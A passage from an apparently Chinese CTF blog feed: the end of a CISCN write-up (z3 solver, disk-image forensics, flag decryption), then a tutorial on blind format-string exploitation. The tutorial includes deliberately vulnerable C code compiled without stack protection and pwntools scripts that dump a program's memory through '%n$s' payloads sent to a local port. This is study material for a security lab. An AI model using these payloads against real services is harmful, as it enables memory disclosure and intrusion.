class="number">53</span> * v82 + <span class="number">36</span> * v84 + <span class="number">86</span> * v85 + <span class="number">25</span> * v86 + <span class="number">46</span> * v87)</span><br><span class="line">s.add(v42 == <span class="number">78</span> * v82 + <span class="number">39</span> * v81 + <span class="number">52</span> * v83 + <span class="number">9</span> * v84 + <span class="number">62</span> * v85 + <span class="number">37</span> * v86 + <span class="number">84</span> * v87)</span><br><span class="line">s.add(v43 == <span class="number">48</span> * v85 + <span class="number">14</span> * v83 + <span class="number">23</span> * v81 + <span class="number">6</span> * v82 + <span class="number">74</span> * v84 + <span class="number">12</span> * v86 + <span class="number">83</span> * v87)</span><br><span class="line">s.add(v44 == <span class="number">15</span> * v86 + <span class="number">48</span> * v85 + <span class="number">92</span> * v83 + <span class="number">85</span> * v82 + <span class="number">27</span> * v81 + <span class="number">42</span> * v84 + <span class="number">72</span> * v87)</span><br><span class="line">s.add(v45 == <span class="number">26</span> * v86 + <span class="number">67</span> * v84 + <span class="number">6</span> * v82 + <span class="number">4</span> * v81 + <span class="number">3</span> * v83 + <span class="number">68</span> * v87)</span><br><span class="line"><span class="built_in">print</span> s.check()</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">m = s.model()</span><br><span class="line"><span class="built_in">print</span> m</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;no answer&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> m.decls():</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;%s = %s&quot;</span> % (d.name(), m[d])</span><br></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><ul><li>点进去助力一下，过了段时间出来个小喇叭说得到flag了交了就好了</li></ul><h2 id="电脑被黑"><a href="#电脑被黑" class="headerlink" title="电脑被黑"></a>电脑被黑</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~:file disk_dump </span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; disk_dump: Linux rev 1.0 ext3 filesystem data, UUID=4a3914c4-f9c1-4ec7-b682-c5554ce2f47f (large files)</span></span><br></pre></td></tr></table></figure><p>ext3 filesystem data linux 平台下的备份移动文件，重新挂载可以读取原始资料</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -o loop .&#x2F;disk_dump &#x2F;mnt</span><br></pre></td></tr></table></figure><p>demo 为加密程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">v7 = fopen(argv[<span class="number">1</span>], <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( v7 )</span><br><span class="line">&#123;</span><br><span class="line">  stream = fopen(argv[<span class="number">1</span>], <span class="string">&quot;rb+&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = fgetc(v7);</span><br><span class="line">      <span class="keyword">if</span> ( v6 == <span class="number">-1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      fputc(v4 ^ (v5 + v6), stream);</span><br><span class="line">      v4 += <span class="number">34</span>;</span><br><span class="line">      v5 = (v5 + <span class="number">2</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(v7);</span><br><span class="line">    fclose(stream);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cannot open file&quot;</span>, <span class="string">&quot;rb+&quot;</span>, argv);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;cannot open this file&quot;</span>, <span class="string">&quot;rb&quot;</span>, argv);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据算法可以知道加密后的密文写回到原文件中。使用 fakeflag.txt 内容进行解密乱码。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings disk_dump | grep &quot;flag&quot;</span><br></pre></td></tr></table></figure><p>找到有另外一个 flag.txt ，数据恢复出来：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extundelete --restore-all disk_dump -o out</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : $&#123;DATE&#125; $&#123;TIME&#125;</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : 电脑被黑.py</span></span><br><span class="line"><span class="comment"># @Software: $&#123;PRODUCT_NAME&#125;</span></span><br><span class="line">c = [<span class="number">0x44</span>,<span class="number">0x2a</span>,<span class="number">0x03</span>,<span class="number">0xe5</span>,<span class="number">0x29</span>,<span class="number">0xa3</span>,<span class="number">0xaf</span>,<span class="number">0x62</span>,<span class="number">0x05</span>,<span class="number">0x31</span>,<span class="number">0x4e</span>,<span class="number">0xf3</span>,<span class="number">0xd6</span>,<span class="number">0xeb</span>,<span class="number">0x90</span>,<span class="number">0x66</span>,<span class="number">0x24</span>,<span class="number">0x5c</span>,<span class="number">0xb7</span>,<span class="number">0x92</span>,<span class="number">0xf6</span>,<span class="number">0xd7</span>,<span class="number">0x4d</span>,<span class="number">0x0b</span>,<span class="number">0x6a</span>,<span class="number">0x41</span>,<span class="number">0xa3</span>,<span class="number">0x85</span>,<span class="number">0xef</span>,<span class="number">0x90</span>,<span class="number">0x5a</span>,<span class="number">0x7e</span>,<span class="number">0x5b</span>,<span class="number">0xec</span>,<span class="number">0xc1</span>,<span class="number">0xf0</span>,<span class="number">0xd4</span>,<span class="number">0x61</span>,<span class="number">0x12</span>,<span class="number">0x12</span>,<span class="number">0x45</span>,<span class="number">0xeb</span>,<span class="number">0xb8</span>]</span><br><span class="line">v4 = <span class="number">34</span></span><br><span class="line">v5 = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cr <span class="keyword">in</span> c:</span><br><span class="line">flag += <span class="built_in">chr</span>(((cr^v4)-v5)%<span class="number">256</span>)</span><br><span class="line">v4+=<span class="number">34</span></span><br><span class="line">v5=(v5+<span class="number">2</span>)&amp;<span class="number">0xf</span></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="the-best-ctf-game"><a href="#the-best-ctf-game" class="headerlink" title="the_best_ctf_game"></a>the_best_ctf_game</h2><p>记事本直接打开，删除无用字节得到 flag</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CISCN </tag>
            
            <tag> 国赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Blind_pwn之格式化字符串</title>
      <link href="archives/ca13b906/"/>
      <url>archives/ca13b906/</url>
      
        <content type="html"><![CDATA[<p>[scode type=”lblue”]文章首发于<a href="http://www.heetian.com/info/828">合天众智</a>，转载到博客仅作备份[/scode]</p><h2 id="可能需要提前了解的知识"><a href="#可能需要提前了解的知识" class="headerlink" title="可能需要提前了解的知识"></a>可能需要提前了解的知识</h2><ul><li>格式化字符串原理&amp;利用</li><li>got &amp; plt 调用关系</li><li>程序的一般启动过程</li></ul><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>格式化字符串盲打指的是只给出可交互的 ip 地址与端口，不给出对应的 binary 文件来让我们无法通过 IDA 分析，其实这个和 BROP 差不多，不过 BROP 利用的是栈溢出，而这里我们利用的是无限格式化字符串漏洞，把在内存中的程序给<code>dump</code>下来。</p><p>一般来说，我们按照如下步骤进行</p><ul><li>确定程序的位数（不同位数有些许差别）</li><li>确定漏洞位置</li><li>利用</li></ul><h2 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h2><ul><li>可以读入 ‘\x00’ 字符的</li><li>输出函数均是 ‘\x00’ 截断的</li><li>能无限使用格式化字符串漏洞</li></ul><h2 id="32-位利用手法"><a href="#32-位利用手法" class="headerlink" title="32 位利用手法"></a>32 位利用手法</h2><h3 id="实验环境准备"><a href="#实验环境准备" class="headerlink" title="实验环境准备"></a>实验环境准备</h3><p>程序源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">int</span> flag;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">    FILE* f;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fgets(buf, <span class="number">1024</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hi, &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,buf);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    flag = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (flag == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Do you want the flag?&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(buf,<span class="string">&#x27;\0&#x27;</span>,<span class="number">1024</span>);</span><br><span class="line">read(STDIN_FILENO, buf, <span class="number">100</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(buf, <span class="string">&quot;no\n&quot;</span>))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;I see. Good bye.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your input isn&#x27;t right:&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please Try again!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译 32 位文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -z execstack -fno-stack-protector -m32 -o leakmemory leakmemory.c</span><br></pre></td></tr></table></figure><p>用 socat 挂到端口 10001 上部署：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:10001,fork EXEC:./leakmemory</span><br></pre></td></tr></table></figure><p>实验环境完成，如果是本地部署的话，等等在 exp 里面写 remote(“127.0.0.1”,10001) 模拟没有 binary 的远程盲打情况。</p><h3 id="确定程序的位数"><a href="#确定程序的位数" class="headerlink" title="确定程序的位数"></a>确定程序的位数</h3><p>用 %p 看看程序回显输出的长度是多少，以此判断程序的位数。这里看到回显是 4 个字节，判断是 32 位程序。可以再多泄露几个，都是 4 字节（含）以下的，确定为 32 位程序。</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-06-26-Kx9VDaOOQNBdpnH2.png"></p><h3 id="确定格式化字符串偏移"><a href="#确定格式化字符串偏移" class="headerlink" title="确定格式化字符串偏移"></a>确定格式化字符串偏移</h3><p>找到格式化字符串的偏移是多少，在后续操作中会用到。由于没有 binary 不能通过调试分析偏移，就采取输入多个 %p 泄露出偏移。为了容易辨认，字符串开始先填充 4 字节 的填充（64位8字节），然后再填入 %p 。</p><p>最后确认偏移为 7 。</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-06-26-f9Zjpwdc65xvO91W.png"></p><h3 id="dump-程序"><a href="#dump-程序" class="headerlink" title="dump 程序"></a>dump 程序</h3><p>dump 程序应该选哪个格式化字符串：</p><p><strong>%n$s</strong> ：将第 n 个参数的值作为地址，输出这个地址指向的字符串内容</p><p><strong>%n$p</strong> ：将第 n 个参数的值作为内容，以十六进制形式输出</p><p>我们是需要 dump 程序，也就是想获取我们所给定地址的内容，而不是获取我们给定的地址。所以应该用 <strong>%n$s</strong> 把我们给定地址当作指针，输出给定地址所指向的字符串。结合前面知道格式化字符串偏移为 7 ，payload 应该为：<code>%9$s.TMP[addr]</code> 。</p><p><strong>注意</strong>：使用 %s 进行输出并不是一个字节一个字节输出，而是一直输出直到遇到 \x00 截止符才会停止，也就是每次泄露的长度是不确定的，可能很长也可能是空。因为 .text 段很可能有连续 \x00 ，所以泄露脚本处理情况有：</p><ol><li>针对每次泄露长度不等，addr 根据每次泄露长度动态增加；</li><li>泄露字符串可能为空，也就是如何处理 \x00 ；</li></ol><p>除此之外，还有一个问题是泄露的起始地址在哪里？从各个大佬文章学到两种做法：从 .text 段开始；从程序加载地方开始；两种方法泄露出来程序，在 ida 中呈现有差别。</p><h4 id="从程序加载地方开始"><a href="#从程序加载地方开始" class="headerlink" title="从程序加载地方开始"></a>从程序加载地方开始</h4><p>先来说省事的，<strong>从程序加载地方开始</strong>。程序加载地方 32 位和 64 位各不相同：</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-06-26-CTSvll4wMcTxU1DR.png"></p><p>32 位：从 0x8048000 开始泄露</p><p>64 位：从 0x400000 开始泄露</p><p>下面是这条例题的泄露脚本，结合注解分析如何处理上面提到的问题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python </span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;%9$s.TMP&quot;</span> + p32(addr)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;leaking:&quot;</span>, <span class="built_in">hex</span>(addr)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;right:&#x27;</span>)</span><br><span class="line">    ret = r.recvuntil(<span class="string">&quot;.TMP&quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;ret:&quot;</span>, binascii.hexlify(ret), <span class="built_in">len</span>(ret)</span><br><span class="line">    remain = r.recvrepeat(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="comment"># name</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;nameaaa&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">begin = <span class="number">0x8048000</span></span><br><span class="line">text_seg =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        ret = leak(begin)</span><br><span class="line">        text_seg += ret</span><br><span class="line">        begin += <span class="built_in">len</span>(ret)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ret) == <span class="number">0</span>:   <span class="comment"># nil</span></span><br><span class="line">            begin +=<span class="number">1</span></span><br><span class="line">            text_seg += <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span> e</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+]&#x27;</span>,<span class="built_in">len</span>(text_seg)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dump_bin&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(text_seg)</span><br></pre></td></tr></table></figure><p><strong>注解</strong>：</p><ul><li>19-21 行：处理无关泄露的程序流程后，进入格式化字符串漏洞输入状态</li><li>24 行：32 位系统加载地址</li><li>9 行：”%9$s.TMP” 中的 .TMP 既是填充对齐，也是分隔符，方便后面处理数据</li><li>14 行：使用binascii 将泄漏出来字符串每一个都从 ascii 转换为 十六进制，方便显示</li><li>15 行：r.recvrepeat(0.2) 接受返回的垃圾数据，方便下一轮的输入</li><li>30 行：泄漏地址动态增加，假如泄漏 1 字节就增加 1 ；泄漏 3 字节就增加 3 </li><li>31-33 行：处理泄漏长度为 0 ，也就是数据是 \x00 的情况。地址增加 1 ，程序数据加 \x00</li></ul><p>运行之后，耐心等待泄漏完成。泄漏出来的程序是不能运行的，但可以在 ida 进过处理可以进行分析、找 plt 、got.plt 等。</p><p>将泄漏出来的程序，放入 ida ，启动时选择<strong>以 binary file 加载</strong>，勾选 <strong>Load as code segment</strong>，并**调整偏移为： 0x8048000 **（开始泄露的地址）：</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-06-26-oxwzGb3pT5h8FyVj.png"></p><p>可以通过 shift+F12 查字符串定位到 main 函数，然后直接 F5 反编译：</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200626230020.png"></p><p>基本结构已经出来了，盲打没有源代码，就需要根据传入参数去判断哪个 sub_xxx 是哪个函数了。比如输出格式化字符串的 sub_8048490 就是 printf 。</p><h4 id="从-text-段开始"><a href="#从-text-段开始" class="headerlink" title="从 .text 段开始"></a>从 .text 段开始</h4><p>程序启动过程：</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200627002443.png"></p><p>从 _start 函数开始就是 .text 段，可以在 ida 中打开一个正常的 binary 观察 text 段开头第一个函数就是 _stat ：（图为 32 位程序）</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-06-27-ClxPYjJqw26gj8Ff.png"></p><p>先用 %p 泄露出栈上数据，找到两个相同地址，而且这个地址很靠近程序加载初地址（32位：0x8048000；64位：0x400000）。脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;nameaaa&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">where_is_start</span>(<span class="params">ret_index=null</span>):</span></span><br><span class="line">    return_addr=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):</span><br><span class="line">        payload = <span class="string">&#x27;%%%d$p.TMP&#x27;</span> % (i)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;right:&#x27;</span>)</span><br><span class="line">        val = p.recvuntil(<span class="string">&#x27;.TMP&#x27;</span>)</span><br><span class="line">        log.info(<span class="built_in">str</span>(i*<span class="number">4</span>)+<span class="string">&#x27; &#x27;</span>+val.strip().ljust(<span class="number">10</span>))</span><br><span class="line">        <span class="keyword">if</span>(i*<span class="number">4</span>==ret_index):</span><br><span class="line">            return_addr=<span class="built_in">int</span>(val.strip(<span class="string">&#x27;.TMP&#x27;</span>).ljust(<span class="number">10</span>)[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">return</span> return_addr</span><br><span class="line">        p.recvrepeat(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">start_addr=where_is_start()</span><br></pre></td></tr></table></figure><p>最后在偏移 1164 和 1188 找到 text 段地址 0x8048510 ，可以对比上图，上图是这条例题的截图：</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-06-27-Z0d5pjXygPrfk4kN.png"></p><p>泄露脚本和前面一样只需要修改一下起始地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python </span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span> </span><br><span class="line">r = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;%9$s.TMP&quot;</span> + p32(addr)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;leaking:&quot;</span>, <span class="built_in">hex</span>(addr)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;right:&#x27;</span>)</span><br><span class="line">    ret = r.recvuntil(<span class="string">&quot;.TMP&quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;ret:&quot;</span>, binascii.hexlify(ret), <span class="built_in">len</span>(ret)</span><br><span class="line">    remain = r.recvrepeat(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="comment"># name</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;nameaaa&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">begin = <span class="number">0x8048510</span></span><br><span class="line"><span class="comment">#begin = 0x8048000</span></span><br><span class="line">text_seg =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        ret = leak(begin)</span><br><span class="line">        text_seg += ret</span><br><span class="line">        begin += <span class="built_in">len</span>(ret)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ret) == <span class="number">0</span>:   <span class="comment"># nil</span></span><br><span class="line">            begin +=<span class="number">1</span></span><br><span class="line">            text_seg += <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span> e</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+]&#x27;</span>,<span class="built_in">len</span>(text_seg)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dump_bin_text&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(text_seg)</span><br></pre></td></tr></table></figure><p>将泄露文件放入 ida 分析，启动时选择<strong>以 binary file 加载</strong>，勾选<strong>Load as code segment</strong>，并**调整偏移为： 0x8048510 **（开始泄露地址）：</p><p><img src= "/img/loading.gif" 